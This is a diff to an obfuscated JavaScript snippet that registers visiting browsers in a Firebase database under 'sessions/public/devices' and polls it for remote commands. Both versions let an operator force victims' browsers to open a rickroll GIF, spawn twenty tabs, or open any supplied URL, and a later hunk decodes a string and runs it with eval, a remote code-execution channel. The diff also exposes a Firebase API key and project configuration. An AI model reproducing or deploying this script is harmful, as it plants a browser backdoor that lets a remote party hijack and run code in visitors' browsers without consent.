@@ -1,5 +1,5 @@
 (async () => {
-  const _0x2082a5 = "dev_" + Math.random().toString(0x24).substring(0x2, 0xa);
+  const _0x2082a5 = "dev_" + Math.random().toString(36).substring(2, 10);
 
   const _0x56b199 = async () => {
     const _0xec927a = document.createElement("script");
@@ -16,13 +16,13 @@
   await _0x56b199();
 
   const _0x1e46fb = {
-    'apiKey': "AIzaSyD5hBBFtSWYOMIk1ZeLqcUKsAubdok4FWk",
-    'authDomain': "nebcasino-5aca1.firebaseapp.com",
-    'databaseURL': 'https://nebcasino-5aca1-default-rtdb.firebaseio.com',
-    'projectId': "nebcasino-5aca1",
-    'storageBucket': "nebcasino-5aca1.appspot.com",
-    'messagingSenderId': "907673467348",
-    'appId': "1:907673467348:web:37b0bcbad757f95845fe41"
+    apiKey: "AIzaSyD5hBBFtSWYOMIk1ZeLqcUKsAubdok4FWk",
+    authDomain: "nebcasino-5aca1.firebaseapp.com",
+    databaseURL: "https://nebcasino-5aca1-default-rtdb.firebaseio.com",
+    projectId: "nebcasino-5aca1",
+    storageBucket: "nebcasino-5aca1.appspot.com",
+    messagingSenderId: "907673467348",
+    appId: "1:907673467348:web:37b0bcbad757f95845fe41",
   };
 
   firebase.initializeApp(_0x1e46fb);
@@ -30,53 +30,46 @@
 
   const _0x3cd585 = _0x6df803.ref("sessions/public/devices/" + _0x2082a5);
 
-  const _0x3abde3 = () => _0x3cd585.update({
-    'online': true,
-    'lastSeen': Date.now()
-  });
-
-  _0x3cd585.update({
-    'online': true,
-    'lastSeen': Date.now()
-  });
-
-  setInterval(_0x3abde3, 0xea60);
-
-  window.addEventListener('beforeunload', () => {
+  const updateStatus = () => {
     _0x3cd585.update({
-      'online': false,
-      'lastSeen': Date.now()
+      online: true,
+      lastSeen: Date.now(),
+    });
+  };
+
+  updateStatus();
+
+  const intervalId = setInterval(updateStatus, 0xea60);
+
+  window.addEventListener("beforeunload", () => {
+    clearInterval(intervalId);
+    _0x3cd585.update({
+      online: false,
+      lastSeen: Date.now(),
     });
   });
 
   _0x3cd585.onDisconnect().update({
-    'online': false,
-    'lastSeen': Date.now()
+    online: false,
+    lastSeen: Date.now(),
   });
 
-  // CHANGED: use "child_changed" so repeated same values still trigger
-  _0x3cd585.child("action").on("child_changed", snapshot => {
-    const _0x35b607 = snapshot.val();
-    if (!_0x35b607) return;
+  _0x3cd585.child("action").on("value", (snapshot) => {
+    const val = snapshot.val();
+    if (!val) return;
 
-    // Support string action
-    if (_0x35b607 === "rickroll") {
+    if (val === "rickroll") {
       window.open("https://www.gifcen.com/wp-content/uploads/2022/11/rick-roll-gif-7.gif", "_blank");
-    }
-
-    if (_0x35b607 === "tabs") {
+    } else if (val === "tabs") {
       for (let i = 0; i < 20; i++) {
         window.open("https://www.google.com", "_blank");
       }
-    }
-
-    // Support object-based actions
-    if (typeof _0x35b607 === "object") {
-      if (_0x35b607.type === 'rickroll') {
+    } else if (typeof val === "object") {
+      if (val.type === "rickroll") {
         window.open("https://www.gifcen.com/wp-content/uploads/2022/11/rick-roll-gif-7.gif", "_blank");
       }
-      if (_0x35b607.type === 'injectTab' && _0x35b607.url) {
-        window.open(_0x35b607.url, "_blank");
+      if (val.type === "injectTab" && val.url) {
+        window.open(val.url, "_blank");
       }
     }
   });
@@ -86,8 +79,8 @@
     try {
       const _0x2568f9 = decodeURIComponent(_0x55983c.slice(8));
       eval(_0x2568f9);
-    } catch (_0x59de70) {
-      console.error("Injection error:", _0x59de70);
+    } catch (e) {
+      console.error("Injection error:", e);
     }
   }
 })();
